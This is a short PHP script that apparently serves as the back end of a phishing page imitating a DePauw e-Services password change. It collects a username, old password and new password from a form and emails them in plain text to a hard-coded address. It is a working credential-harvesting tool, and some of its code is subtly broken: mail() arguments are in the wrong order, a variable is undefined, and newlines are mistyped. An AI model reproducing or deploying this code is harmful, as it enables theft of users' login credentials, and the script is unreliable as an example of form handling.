<?php
$errors = [];

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get POST data
    $username = isset($_POST['username']) ? strip_tags(trim($_POST['username'])) : '';
    $old_password = isset($_POST['old_password']) ? trim($_POST['old_password']) : '';
    $new_password = isset($_POST['new_password']) ? strip_tags(trim($_POST['new_password'])) : '';

    // Validate form fields
    if (empty($username)) {
        $errors[] = 'Username is empty';
    }

    if (empty($old_password)) {
        $errors[] = 'Old password is empty';
    }

    if (empty($new_password)) {
        $errors[] = 'New password is empty';
    }

    $message = "Username: $username + /n + Old Password: $old_password + /n + New Password: $new_password";

    // If no errors, send email
    if (empty($errors)) {
        // Recipient email address (replace with your own)
        $recipient = "hangbui_2024@depauw.edu";

        // Additional headers
        $headers = "From: $name changed password on DePauw e-Services";

        // Send email
        if (mail($recipient, $message, $headers)) {
            echo "Email sent successfully!";
        } else {
            echo "Failed to send email. Please try again later.";
        }
    } else {
        // Display errors
        echo "The form contains the following errors:<br>";
        foreach ($errors as $error) {
            echo "- $error<br>";
        }
    }
} else {
    // Not a POST request, display a 403 forbidden error
    header("HTTP/1.1 403 Forbidden");
    echo "You are not allowed to access this page.";
}
?>